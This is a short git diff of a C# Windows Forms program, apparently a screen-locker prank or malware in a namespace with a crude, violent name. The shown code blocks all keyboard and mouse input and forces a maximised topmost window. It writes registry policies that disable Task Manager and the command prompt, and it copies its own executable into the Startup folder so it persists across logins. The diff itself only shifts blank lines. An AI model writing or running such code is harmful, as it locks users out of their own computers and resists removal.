@@ -25,18 +25,18 @@ namespace pcRaper4000
         
         private void Form1_Load(object sender, EventArgs e)
         {
-            
-
             //even if they crtl alt del their input will be blocked and they cant hit the windows key
             BlockInput(true);
             this.TopMost = true;
             this.FormBorderStyle = FormBorderStyle.None;
             this.WindowState = FormWindowState.Maximized;
 
+            
             //disable task manager
             RegistryKey disabletask = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
             if (disabletask.GetValue("DisableTaskMgr") == null)
                 disabletask.SetValue("DisableTaskMgr", "1");
+            
             else
                 disabletask.DeleteValue("DisableTaskMgr");
                 disabletask.Close();
@@ -46,6 +46,7 @@ namespace pcRaper4000
             RegistryKey disablecmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
             if (disablecmd.GetValue("DisableCMD") == null)
                 disablecmd.SetValue("DisableCMD", "1");
+            
             else
                 disablecmd.DeleteValue("DisableCMD");
                 disablecmd.Close();
@@ -61,10 +62,7 @@ namespace pcRaper4000
                 if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
                 {
                     System.IO.File.Copy(Application.ExecutablePath, Filepath);
-
-
                 }
-            
         }
         
         //disable alt f4
